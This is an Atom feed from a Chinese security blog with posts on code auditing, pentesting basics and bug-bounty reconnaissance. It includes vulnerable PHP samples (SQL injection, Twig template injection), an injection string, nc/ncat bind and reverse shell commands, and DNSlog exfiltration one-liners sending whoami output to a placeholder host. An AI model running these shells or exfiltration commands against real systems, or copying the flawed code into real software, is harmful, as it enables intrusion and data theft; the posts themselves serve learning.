<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://ink-scholar.github.io/atom.xml" rel="self"/>
  
  <link href="https://ink-scholar.github.io/"/>
  <updated>2023-12-17T16:34:16.865Z</updated>
  <id>https://ink-scholar.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计概述</title>
    <link href="https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/"/>
    <id>https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</id>
    <published>2023-12-17T12:43:25.221Z</published>
    <updated>2023-12-17T16:34:16.865Z</updated>
    
    <content type="html"><![CDATA[<p>先来一张图</p><img src="/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231217210117066.png" alt="image-20231217210117066" style="zoom:33%;"><p>术：漏洞利用的工具使用，什么代码、什么框架用什么工具；遇到什么站拿什么打（骚操作、技巧）</p><p>用：漏洞的挖掘思维，代码的审计思维，安全开发的思维（某一个门类的共性）</p><p>体：安全核心，安全思维，漏洞产生的根本原因，漏洞的抽象共性（整个安全的底层基础）</p><p>即 一线技巧 –》 思考者 –》 安全本质</p><p>个人觉得说的很好，深有感触 </p><h1 id="安全的本质"><a href="#安全的本质" class="headerlink" title="安全的本质"></a>安全的本质</h1><p>信任问题！</p><p>一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须要有一些最基本的假设，安全方案才能得以建立。反之，如果我们否定一切，安全方案就会变成无源之水、无本之木，无法设计，也无法完成。</p><p>是否该信任普通用户的输入？（前台漏洞）</p><p>是否该信任管理员用户的输入？（后台漏洞）</p><p>是否该信任升级包、离线升级、在线升级、自动化升级？（供应链攻击）</p><p>不信任任何输入？（信任了输入的检测逻辑）</p><h1 id="安全方案模型"><a href="#安全方案模型" class="headerlink" title="安全方案模型"></a>安全方案模型</h1><p>所有的安全模型，都可以简化成一种最简易的模型：输入&#x3D;&#x3D;》检测是否有安全风险&#x3D;&#x3D;》输出</p><h1 id="为什么是输入？？"><a href="#为什么是输入？？" class="headerlink" title="为什么是输入？？"></a>为什么是输入？？</h1><p>所有的输入都是恶意的：入侵检测理论的名言</p><p>我们能掌控的只有输入：我们挖掘漏洞最好的入口点，也是也只能从输入去入手</p><p>在整个代码审计的过程中，一定要紧紧抓住输入，结合不同语言的特点，跟踪传播链条是否有可疑点</p><h1 id="程序希望用户输入什么"><a href="#程序希望用户输入什么" class="headerlink" title="程序希望用户输入什么"></a>程序希望用户输入什么</h1><h2 id="控制流与数据流"><a href="#控制流与数据流" class="headerlink" title="控制流与数据流"></a>控制流与数据流</h2><p>看两段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;Hello my name is :</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(Hello my name is :<span class="string">&quot; + &quot;</span>&lt;?php</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将代码分成两部分，一部分是控制代码走向的控制流代码，另一部分是用来被展示、被存储、被流转的数据流代码（包括输入数据、程序员本来就硬编码的数据）</p><p><strong>程序员希望用户输入的一定数据流而不是控制流</strong></p><p>一旦我们  <strong>输入的数据</strong>  能够以某种方式侵入到控制流时，漏洞就产生了</p><p>如下</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from table where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看一下输入到流转：</p><p>输入 –》 php字符串变量 –》 sql语句 –》 数据库</p><p>在数据库层面，控制流是sql语句，原本这段代码的本意是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">action：select</span><br><span class="line">object：table</span><br><span class="line">subject：*</span><br><span class="line">condition：</span><br><span class="line">key：username</span><br><span class="line">value：$username</span><br></pre></td></tr></table></figure><p>代码保证用户的输入只能影响结构中的value位置，如果不能保障，就会出现漏洞</p><p>比如我们输入：<strong>admin’ and 1&#x3D;1#</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">action：select</span><br><span class="line">object：table</span><br><span class="line">subject：*</span><br><span class="line">condition：</span><br><span class="line">expression：and</span><br><span class="line">key1：username</span><br><span class="line">value1：$username</span><br><span class="line">key2: 1</span><br><span class="line">value2: 1</span><br></pre></td></tr></table></figure><p><strong>我们在代码层（PHP）的输入，导致了数据库（mysql）层的数据流入侵到了控制流</strong></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>服务端模版注入</p><p>Twig是php的一套模板渲染的组件，但是不规范的渲染参数输入方式，可能导致模板注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上这段代码是正确的，没有产生漏洞的，我们来看一下输入流转：</p><p>输入–》php字符串变量$_GET[“name”]–》Twig模板渲染–》发现变量–》找到变量name的绑定–》解析字符串–》渲染展示</p><p>我们再看一下错误的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line"><span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再看一下输入流转：</p><p>输入–》php字符串变量$_GET[“name”]–》拼接字符串”Hello {$_GET[‘name’]}”作为新变量–》Twig模板渲染–》渲染展示</p><h2 id="业务流程问题"><a href="#业务流程问题" class="headerlink" title="业务流程问题"></a>业务流程问题</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先来一张图&lt;/p&gt;
&lt;img src=&quot;/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/image-20231217210117066.png&quot; alt=&quot;image-2023121721</summary>
      
    
    
    
    <category term="代码审计" scheme="https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--基础入门</title>
    <link href="https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
    <id>https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</id>
    <published>2023-12-14T14:33:04.392Z</published>
    <updated>2023-12-17T12:26:46.719Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要写一点和web相关的基础知识，随便写写，不成系统</strong></em></p><h1 id="Web环境常规知识"><a href="#Web环境常规知识" class="headerlink" title="Web环境常规知识"></a>Web环境常规知识</h1><p>web应用系统常见的三种搭建方式：子域名、端口、目录三种方式</p><p>其他方式还有类似于博客园这种分配站的形式</p><p>网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高</p><p>对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患</p><p>开源源码–源码可见&#x2F;源码不可见（加密，语言特性）</p><p>加密一般网上有对应的，比如asp、php加解密网站</p><p>语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译</p><p>路由访问：url和文件目录对应不上很正常，要根据配置路由决定</p><p>前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端</p><p>类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关</p><p>Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写</p><p>WAF:</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217111805176.png" alt="image-20231217111805176"></p><p>CDN：内容分发服务，提高访问速度，可隐藏真实源IP</p><p>反向代理：</p><p>正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130038060.png" alt="image-20231217130038060"></p><p>反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130116573.png" alt="image-20231217130116573"></p><p>因此你的访问目标只是一个代理，而非真实的应用服务器</p><p>正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系</p><p>负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况</p><p>在宝塔中可以如下进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 定义负载设置</span><br><span class="line">upstream fzjh&#123;</span><br><span class="line">server 1.1.1.1:80 weight=2;</span><br><span class="line">server 2.2.2.2:80 weight=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 定义访问路径和策略</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http://fzjh/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>APP&#x2F;小程序应用开发架构：</p><p>1、原生开发</p><p>安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的</p><p>2、H5开发</p><p>使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题</p><p>3、使用flutter开发</p><p>谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善</p><p>4、常规web开发</p><p>就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。</p><h1 id="Web常规命令基础"><a href="#Web常规命令基础" class="headerlink" title="Web常规命令基础"></a>Web常规命令基础</h1><p>推荐个网站：<a href="https://forum.ywhack.com/bountytips.php">https://forum.ywhack.com/bountytips.php</a></p><p>在里面填一些基本信息会将命令显示出来</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217162209085.png" alt="image-20231217162209085"></p><p>文件上传下载：</p><p>Linux：wget，curl，python，ruby，perl，java等</p><p>Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等</p><p>反弹shell：</p><p>正向连接：即自己主动找别人，如Linux控制windows正向连接</p><p>在windows上绑定cmd到本地5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd -lvvp 5566</span><br></pre></td></tr></table></figure><p>然后Linux主动连接windows的5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat ip 5566</span><br></pre></td></tr></table></figure><p>同理，windows控制Linux的话，在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh -lvvp 5566</span><br></pre></td></tr></table></figure><p>在windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 5566</span><br></pre></td></tr></table></figure><p>反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接</p><p>在Windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure><p>在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e  /bin/sh windows的ip windows本地正在监听的端口</span><br></pre></td></tr></table></figure><p>管道符：</p><p>Windows：|  &amp;  ||   &amp;&amp;</p><p>Linux：;  |   ||   &amp;   &amp;&amp;   &#96;&#96;</p><p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行</p><p>管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果</p><p>&amp;放在启动参数后面表示设置此进程为后台进程</p><p>只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行</p><p>只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行</p><p>数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell $a=whoami;$a=$a.replace(&#x27;\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c</span><br></pre></td></tr></table></figure><p> 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \ ，所有加个replace去替换</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一点和web相关的基础知识，随便写写，不成系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Web环境常规知识&quot;&gt;&lt;a href=&quot;#Web环境常规知识&quot; class=&quot;headerlink&quot; title=&quot;Web环境常规知识&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="基础" scheme="https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>SRC通用讲解</title>
    <link href="https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/"/>
    <id>https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/</id>
    <published>2023-11-24T13:12:12.413Z</published>
    <updated>2023-12-06T15:42:58.179Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金</strong></em></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="网络空间搜索"><a href="#网络空间搜索" class="headerlink" title="网络空间搜索"></a>网络空间搜索</h2><h3 id="精准搜索"><a href="#精准搜索" class="headerlink" title="精准搜索"></a>精准搜索</h3><h4 id="域名搜索"><a href="#域名搜索" class="headerlink" title="域名搜索"></a>域名搜索</h4><p>Fofa：domain&#x3D;“baidu.com”</p><p>Hunter：domain.suffix&#x3D;”Baidu.com”</p><p>Google：site:baidu.com</p><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>微步：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>360：<a href="https://ti.360.cn/">https://ti.360.cn/</a></p><p>旁站查询：<a href="https://webscan.cc/">https://webscan.cc</a>         （对于IP站更好一点）</p><h4 id="子域名工具"><a href="#子域名工具" class="headerlink" title="子域名工具"></a>子域名工具</h4><p>水泽：<a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p><p>灯塔魔改版：<a href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker</a></p><p>Nemo：<a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a></p><p>推荐灯塔魔改版</p><h4 id="企业查询"><a href="#企业查询" class="headerlink" title="企业查询"></a>企业查询</h4><p>小蓝本、企查查、爱企查、微信小程序、公众号</p><h3 id="模糊搜索"><a href="#模糊搜索" class="headerlink" title="模糊搜索"></a>模糊搜索</h3><h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h4><p>Github关键字搜索</p><p>网络空间搜索引擎body，title，ico特征，js特征搜索</p><p>通用系统搜索</p><p>CNVD通用搜索</p><p>EDU通用搜索</p><h4 id="短视频信息搜索"><a href="#短视频信息搜索" class="headerlink" title="短视频信息搜索"></a>短视频信息搜索</h4><p>抖音快手B站等，直接搜索内容，如：腾讯后台登录教程，可以看到一些url甚至是账号密码</p><h4 id="语雀搜索"><a href="#语雀搜索" class="headerlink" title="语雀搜索"></a>语雀搜索</h4><p> 语雀搜索是需要登录的，登录后可以进入页面 <a href="https://www.yuque.com/dashboard">https://www.yuque.com/dashboard</a> ，左上角会存在搜索</p><p>当然登陆客户端也有</p><img src="/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/image-20231206224628687.png" alt="image-20231206224628687" style="zoom: 33%;"><h2 id><a href="#" class="headerlink" title></a></h2><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><h1 id="条件竞争（并发）"><a href="#条件竞争（并发）" class="headerlink" title="条件竞争（并发）"></a>条件竞争（并发）</h1><h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h1 id="CORS➕XSS"><a href="#CORS➕XSS" class="headerlink" title="CORS➕XSS"></a>CORS➕XSS</h1><h1 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h1><h1 id="SSRF➕RCE"><a href="#SSRF➕RCE" class="headerlink" title="SSRF➕RCE"></a>SSRF➕RCE</h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h1 id="云安全"><a href="#云安全" class="headerlink" title="云安全"></a>云安全</h1><h1 id="常见框架漏洞"><a href="#常见框架漏洞" class="headerlink" title="常见框架漏洞"></a>常见框架漏洞</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信</summary>
      
    
    
    
    <category term="SRC" scheme="https://ink-scholar.github.io/categories/SRC/"/>
    
    
    <category term="src" scheme="https://ink-scholar.github.io/tags/src/"/>
    
  </entry>
  
</feed>
